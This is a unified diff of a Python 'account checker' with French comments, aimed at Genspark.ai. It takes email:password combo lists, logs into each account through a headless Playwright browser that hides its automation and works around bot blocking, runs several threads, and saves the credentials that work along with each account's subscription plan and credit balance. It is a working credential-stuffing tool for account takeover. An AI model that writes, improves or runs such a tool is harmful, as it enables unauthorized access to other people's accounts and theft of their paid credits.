@@ -1,18 +1,43 @@
+"""
+Genspark.ai Account Checker
+Vérifie les comptes et récupère : Plan, Interval, Balance.
+
+INSTALLATION REQUISE :
+    pip install requests playwright
+    python3 -m playwright install chromium
+
+UTILISATION :
+    Mettre les comptes dans combo.txt (format email:password, un par ligne)
+    python3 cc.py
+
+EXPLICATION DU FLUX :
+    Genspark utilise Azure B2C avec PKCE géré côté serveur.
+    La seule façon fiable de s'authentifier est de passer par
+    https://www.genspark.ai/api/login qui génère le PKCE server-side
+    et redirige vers Azure. Un navigateur headless (Playwright) gère
+    le formulaire Azure, puis on extrait le session_id pour les API calls.
+"""
+
+import asyncio
 import requests
-import re
-import json
 import os
 import threading
-import time
+import json
 from queue import Queue
 
-# === CONFIGURATION ===
-NUM_THREADS           = 10          # lower = less Cloudflare blocking
-COMBO_FILE            = "combo.txt"
-VALID_ACCOUNTS_FILE   = "comptes_valides.txt"
-INVALID_ACCOUNTS_FILE = "comptes_invalides.txt"
+from playwright.async_api import async_playwright
 
-# === COLORS ===
+# ── CONFIGURATION ──────────────────────────────────────────────────────────────
+NUM_THREADS          = 5          # Playwright est lourd → 5 threads max recommandé
+COMBO_FILE           = "combo.txt"
+VALID_ACCOUNTS_FILE  = "comptes_valides.txt"
+INVALID_ACCOUNTS_FILE= "comptes_invalides.txt"
+
+USER_URL    = "https://www.genspark.ai/api/user"
+BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"
+LOGIN_URL   = "https://www.genspark.ai/api/login?redirect_url=%2F"
+
+
 class Colors:
     GREEN   = '\033[92m'
     RED     = '\033[91m'
@@ -21,165 +46,217 @@ class Colors:
     MAGENTA = '\033[95m'
     RESET   = '\033[0m'
 
-# === GLOBALS ===
+
 file_lock      = threading.Lock()
 combo_queue    = Queue()
 checked_count  = 0
 valid_count    = 0
 total_accounts = 0
 
-USER_URL    = "https://www.genspark.ai/api/user"
-BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"
 
-HEADERS = {
-    'User-Agent'     : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-    'Accept-Language': 'en-US,en;q=0.9',
-}
+# ── API : RÉCUPÉRER PLAN + BALANCE ─────────────────────────────────────────────
 
-
-def get_plan_and_balance(sess):
+def get_plan_and_balance(session):
+    """
+    Appelle /api/user et /api/payment/get_credit_balance.
+    Structure réelle de /api/user :
+    {
+      "status": 0,
+      "data": {
+        "cogen": {
+          "personal_plan": "plus",
+          "personal_paid_sub_interval": "month",
+          ...
+        }
+      }
+    }
+    """
     info = {'plan': 'N/A', 'interval': 'N/A', 'balance': 'N/A'}
+
     try:
-        r = sess.get(USER_URL, timeout=12)
+        r = session.get(USER_URL, timeout=10)
         if r.status_code == 200:
-            body  = r.json()
-            cogen = body.get("data", {}).get("cogen", {})
-            plan     = cogen.get("personal_plan") or cogen.get("plan")
-            interval = cogen.get("personal_paid_sub_interval")
-            if plan:
-                info['plan']     = plan
-            if interval:
-                info['interval'] = interval
+            body = r.json()
+            if body.get('status') == 0:
+                data  = body.get('data', {})
+                cogen = data.get('cogen', {})
+                # personal_plan est sous data.cogen
+                plan = (
+                    cogen.get('personal_plan') or
+                    data.get('personal_plan') or
+                    body.get('personal_plan')
+                )
+                interval = (
+                    cogen.get('personal_paid_sub_interval') or
+                    data.get('personal_paid_sub_interval') or
+                    body.get('personal_paid_sub_interval')
+                )
+                if plan is not None:
+                    info['plan']     = plan if plan else 'free'
+                if interval is not None:
+                    info['interval'] = interval if interval else 'N/A'
     except Exception:
         pass
+
     try:
-        r = sess.get(BALANCE_URL, timeout=12)
+        r = session.get(BALANCE_URL, timeout=10)
         if r.status_code == 200:
-            balance = r.json().get("data", {}).get("balance")
-            if balance is not None:
-                info['balance'] = str(balance)
+            body = r.json()
+            if body.get('status') == 0:
+                bal = body.get('data', {}).get('balance')
+                if bal is not None:
+                    info['balance'] = str(bal)
     except Exception:
         pass
+
     return info
 
 
-def check_account(email, password):
-    sess = requests.Session()
-    sess.headers.update(HEADERS)
+# ── AUTH : CONNEXION VIA PLAYWRIGHT ────────────────────────────────────────────
 
-    try:
-        # ── Step 1 : /api/login → Genspark generates PKCE+state, sets session_id ──
-        # Retry up to 3 times in case of transient errors
-        azure_url = ''
-        for attempt in range(3):
-            try:
-                r_login = sess.get(
-                    'https://www.genspark.ai/api/login?redirect_url=/',
-                    timeout=15,
-                    allow_redirects=False
-                )
-                loc = r_login.headers.get('location', '')
-                if 'login.genspark.ai' in loc:
-                    azure_url = loc
-                    break
-                # If we got a non-redirect (e.g. CF challenge), wait and retry
-                time.sleep(1 + attempt)
-            except Exception:
-                time.sleep(1 + attempt)
+async def login_with_playwright(email, password):
+    """
+    Connexion Genspark avec navigateur headless Playwright.
 
-        if not azure_url:
-            return 'ERROR_NO_AZURE_URL', None
+    Flux correct :
+      1. GET /api/login?redirect_url=/ → Genspark génère PKCE server-side,
+         stocke l'état, redirige vers Azure B2C.
+      2. Remplir #email + #password → cliquer #next.
+      3. Azure redirige vers /api/auth?code=&state= (state = PKCE Genspark).
+      4. Genspark valide avec son code_verifier → session_id authentifiée.
+      5. Extraire session_id → requests.Session prête pour les APIs.
 
-        # ── Step 2 : Load Azure B2C login page ───────────────────────────────────
-        r1 = sess.get(azure_url, timeout=15)
-        if r1.status_code != 200:
-            return 'ERROR_AZURE_LOAD', None
-
-        m = re.search(r'var SETTINGS = ({.*?});', r1.text, re.DOTALL)
-        if not m:
-            return 'ERROR_SETTINGS', None
-
-        sdata          = json.loads(m.group(1))
-        csrf_token     = sdata['csrf']
-        transaction_id = sdata['transId']
-
-        # ── Step 3 : POST credentials ─────────────────────────────────────────────
-        r2 = sess.post(
-            "https://login.genspark.ai/gensparkad.onmicrosoft.com/B2C_1_new_login/SelfAsserted",
-            params={'tx': transaction_id, 'p': 'B2C_1_new_login'},
-            headers={
-                'x-csrf-token'    : csrf_token,
-                'X-Requested-With': 'XMLHttpRequest',
-                'Origin'          : 'https://login.genspark.ai',
-                'Referer'         : r1.url,
-            },
-            data={'request_type': 'RESPONSE', 'email': email, 'password': password},
-            timeout=15
+    Retourne : ('SUCCESS', session) | ('CODE_ERREUR', None)
+    """
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(
+            headless=True,
+            args=[
+                '--disable-blink-features=AutomationControlled',
+                '--no-sandbox',
+                '--disable-dev-shm-usage',
+            ]
         )
-        if r2.status_code != 200:
-            return 'ERROR_UNEXPECTED_RESPONSE', None
-
-        r2_data = r2.json()
-        if r2_data.get("status") == "400":
-            msg = r2_data.get("message", "")
-            msg_lower = msg.lower()
-            if any(x in msg_lower for x in ["incorrect", "password is incorrect", "wrong"]):
-                return 'WRONG_PASSWORD', None
-            if any(x in msg_lower for x in ["find your account", "aadb2c90053"]):
-                return 'ACCOUNT_NOT_FOUND', None
-            if "aadb2c90053" in msg:
-                return 'ACCOUNT_NOT_FOUND', None
-            return 'ERROR_API', None
-
-        if r2_data.get("status") != "200":
-            return 'ERROR_API', None
-
-        # ── Step 4 : confirmed → auth code redirect ───────────────────────────────
-        confirm_url = (
-            "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
-            "B2C_1_new_login/api/CombinedSigninAndSignup/confirmed"
-            "?rememberMe=false"
-            f"&csrf_token={csrf_token}"
-            f"&tx={transaction_id}"
-            "&p=B2C_1_new_login"
+        context = await browser.new_context(
+            user_agent=(
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                'AppleWebKit/537.36 (KHTML, like Gecko) '
+                'Chrome/124.0.0.0 Safari/537.36'
+            ),
+            viewport={'width': 1280, 'height': 800},
         )
-        hop1 = sess.get(confirm_url, timeout=15, allow_redirects=False)
-        hop1_loc = hop1.headers.get('location', '')
+        await context.add_init_script(
+            "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
+        )
+        page = await context.new_page()
 
-        if 'error=' in hop1_loc:
-            if 'AADB2C90053' in hop1_loc:
-                return 'ACCOUNT_NOT_FOUND', None
-            return 'INVALID', None
-
-        if 'code=' not in hop1_loc:
-            return 'ERROR_NO_CODE', None
-
-        # ── Step 5 : /api/auth?code=&state= — Genspark does PKCE exchange ─────────
-        hop2 = sess.get(hop1_loc, timeout=15, allow_redirects=False)
-        hop2_loc = hop2.headers.get('location', '')
-
-        # Success → redirect to "/" ; failure → redirect to /api/logout
-        if '/api/logout' in hop2_loc or '/logout' in hop2_loc:
-            return 'ERROR_NO_SESSION', None
-
-        sess.headers.update({
-            'Referer': 'https://www.genspark.ai/',
-            'Origin' : 'https://www.genspark.ai',
-        })
-
-        # Quick sanity check
         try:
-            rv = sess.get(USER_URL, timeout=12)
-            if rv.status_code == 200 and rv.json().get("status") == -5:
+            # ── Étape 1 : /api/login → Azure B2C ─────────────────────────────────
+            await page.goto(LOGIN_URL, timeout=30000)
+            await page.wait_for_timeout(1000)
+
+            if 'login.genspark.ai' not in page.url:
+                await browser.close()
+                return 'ERROR_AZURE_REDIRECT', None
+
+            # ── Étape 2 : Remplir le formulaire ───────────────────────────────────
+            try:
+                await page.wait_for_selector('#email', timeout=10000)
+            except Exception:
+                await browser.close()
+                return 'ERROR_FORM_NOT_FOUND', None
+
+            await page.fill('#email', email)
+            await page.fill('#password', password)
+            await page.click('#next')
+
+            # ── Étape 3 : Attendre la redirection vers genspark.ai ────────────────
+            try:
+                await page.wait_for_url('https://www.genspark.ai/**', timeout=15000)
+            except Exception:
+                # Toujours sur Azure → lire le message d'erreur
+                if 'login.genspark.ai' in page.url:
+                    try:
+                        page_text = await page.text_content('body')
+                    except Exception:
+                        page_text = ''
+
+                    if 'incorrect' in page_text.lower():
+                        await browser.close()
+                        return 'WRONG_PASSWORD', None
+                    if 'find your account' in page_text.lower():
+                        await browser.close()
+                        return 'ACCOUNT_NOT_FOUND', None
+
+                await browser.close()
+                return 'INVALID', None
+
+            # ── Étape 4 : Vérifier que la session est valide ──────────────────────
+            if 'logout' in page.url:
+                await browser.close()
                 return 'ERROR_NO_SESSION', None
+
+            await page.wait_for_timeout(500)
+
+            # ── Étape 5 : Extraire les cookies ────────────────────────────────────
+            cookies     = await context.cookies(['https://www.genspark.ai'])
+            cookie_dict = {c['name']: c['value'] for c in cookies}
+            session_id  = cookie_dict.get('session_id', '')
+
+            if not session_id:
+                await browser.close()
+                return 'ERROR_NO_SESSION', None
+
+            # ── Étape 6 : Créer une requests.Session ──────────────────────────────
+            rs = requests.Session()
+            rs.cookies.set('session_id', session_id, domain='www.genspark.ai', path='/')
+            for name in ['__cf_bm', '__cflb', 'agree_terms', 'i18n_set']:
+                if name in cookie_dict:
+                    rs.cookies.set(name, cookie_dict[name], domain='www.genspark.ai', path='/')
+            rs.headers.update({
+                'User-Agent': (
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                    'AppleWebKit/537.36 (KHTML, like Gecko) '
+                    'Chrome/124.0.0.0 Safari/537.36'
+                ),
+                'Referer': 'https://www.genspark.ai/',
+                'Origin' : 'https://www.genspark.ai',
+            })
+
+            # Vérification rapide : session réellement authentifiée ?
+            try:
+                rv = rs.get(USER_URL, timeout=10)
+                if rv.status_code == 200:
+                    if rv.json().get('status') == -5:   # session anonyme
+                        await browser.close()
+                        return 'ERROR_NO_SESSION', None
+            except Exception:
+                pass
+
+            await browser.close()
+            return 'SUCCESS', rs
+
         except Exception:
-            pass
+            try:
+                await browser.close()
+            except Exception:
+                pass
+            return 'ERROR_EXCEPTION', None
 
-        return 'SUCCESS', sess
 
-    except (requests.exceptions.RequestException, json.JSONDecodeError, KeyError, TypeError):
-        return 'ERROR_NETWORK', None
+def check_account(email, password):
+    """Wrapper synchrone autour de login_with_playwright."""
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(login_with_playwright(email, password))
+        loop.close()
+        return result
+    except Exception:
+        return 'ERROR_LOOP', None
 
+
+# ── WORKER ─────────────────────────────────────────────────────────────────────
 
 def worker():
     global checked_count, valid_count
@@ -196,55 +273,64 @@ def worker():
             continue
 
         email, password = line.split(':', 1)
-        result_code, sess = check_account(email, password)
+        result_code, session = check_account(email, password)
 
         with file_lock:
             checked_count += 1
 
             if result_code == 'SUCCESS':
                 valid_count += 1
-                info     = get_plan_and_balance(sess)
+                info     = get_plan_and_balance(session)
                 plan     = info['plan']
                 interval = info['interval']
                 balance  = info['balance']
 
-                save_line = f"{line} | Plan: {plan} | Interval: {interval} | Balance: {balance}"
+                save_line = (
+                    f"{line} | Plan: {plan} | "
+                    f"Interval: {interval} | Balance: {balance}"
+                )
                 with open(VALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f:
-                    f.write(save_line + "\n")
+                    f.write(save_line + '\n')
 
-                if plan and plan.lower() == 'pro':
-                    pc = Colors.MAGENTA
-                elif plan and plan.lower() == 'plus':
-                    pc = Colors.GREEN
+                plan_lower = (plan or '').lower()
+                if plan_lower == 'pro':
+                    plan_color = Colors.MAGENTA
+                elif plan_lower == 'plus':
+                    plan_color = Colors.GREEN
                 else:
-                    pc = Colors.YELLOW
+                    plan_color = Colors.YELLOW
 
-                plan_display = plan.upper() if plan != 'N/A' else 'FREE'
                 message = (
                     f"{Colors.GREEN}Compte Valide{Colors.RESET} | "
-                    f"Plan: {pc}{plan_display}{Colors.RESET} | "
+                    f"Plan: {plan_color}{plan.upper()}{Colors.RESET} | "
                     f"Interval: {Colors.CYAN}{interval}{Colors.RESET} | "
                     f"Balance: {Colors.CYAN}{balance} credits{Colors.RESET}"
                 )
 
             else:
                 if result_code == 'WRONG_PASSWORD':
-                    error_msg = "Mot de passe incorrect"
+                    error_msg = 'Mot de passe incorrect'
                 elif result_code in ('ACCOUNT_NOT_FOUND', 'INVALID'):
-                    error_msg = "Compte introuvable"
+                    error_msg = 'Compte introuvable'
                 else:
-                    error_msg = f"Erreur ({result_code})"
+                    error_msg = f'Erreur ({result_code})'
 
                 message = f"{Colors.RED}{error_msg}{Colors.RESET}"
                 with open(INVALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f:
-                    f.write(line + "\n")
+                    f.write(line + '\n')
 
-            print(f"[{checked_count}/{total_accounts}] [Valides: {valid_count}] {line}  ->  {message}")
+            print(
+                f"[{checked_count}/{total_accounts}] "
+                f"[Valides: {valid_count}] "
+                f"{line}  ->  {message}"
+            )
 
         combo_queue.task_done()
 
 
-if __name__ == "__main__":
+# ── POINT D'ENTRÉE ─────────────────────────────────────────────────────────────
+
+if __name__ == '__main__':
     if not os.path.exists(COMBO_FILE):
         print(f"{Colors.RED}ERREUR : '{COMBO_FILE}' introuvable.{Colors.RESET}")
         exit(1)
@@ -254,15 +340,19 @@ if __name__ == "__main__":
 
     with open(COMBO_FILE, 'r', encoding='utf-8') as f:
         lines = [l.strip() for l in f if ':' in l.strip()]
-    for l in lines:
-        combo_queue.put(l)
+    for line in lines:
+        combo_queue.put(line)
 
     total_accounts = len(lines)
     if total_accounts == 0:
-        print(f"{Colors.YELLOW}'{COMBO_FILE}' est vide ou mal formate.{Colors.RESET}")
+        print(f"{Colors.YELLOW}Fichier vide ou mal formaté.{Colors.RESET}")
         exit(1)
 
-    print(f"--- Verification de {total_accounts} comptes ({NUM_THREADS} threads) ---")
+    print(
+        f"--- Vérification de {total_accounts} comptes "
+        f"avec {NUM_THREADS} threads ---"
+    )
+    print("(Playwright headless — authentification fiable)\n")
 
     threads = []
     for _ in range(NUM_THREADS):
@@ -272,8 +362,14 @@ if __name__ == "__main__":
 
     combo_queue.join()
 
-    print(f"\n--- Termine ---")
-    inv = total_accounts - valid_count
-    print(f"Resultats : {valid_count} valides, {inv} invalides sur {total_accounts} comptes.")
-    print(f"{Colors.GREEN}Valides   -> '{VALID_ACCOUNTS_FILE}'{Colors.RESET}")
-    print(f"{Colors.RED}Invalides -> '{INVALID_ACCOUNTS_FILE}'{Colors.RESET}")
+    print(f"\n--- Vérification terminée ---")
+    invalid_count = total_accounts - valid_count
+    print(
+        f"Résultats : {Colors.GREEN}{valid_count} valides{Colors.RESET}, "
+        f"{Colors.RED}{invalid_count} invalides{Colors.RESET} "
+        f"sur {total_accounts} comptes."
+    )
+    print(
+        f"{Colors.GREEN}Valides   → '{VALID_ACCOUNTS_FILE}'{Colors.RESET}\n"
+        f"{Colors.RED}Invalides → '{INVALID_ACCOUNTS_FILE}'{Colors.RESET}"
+    )
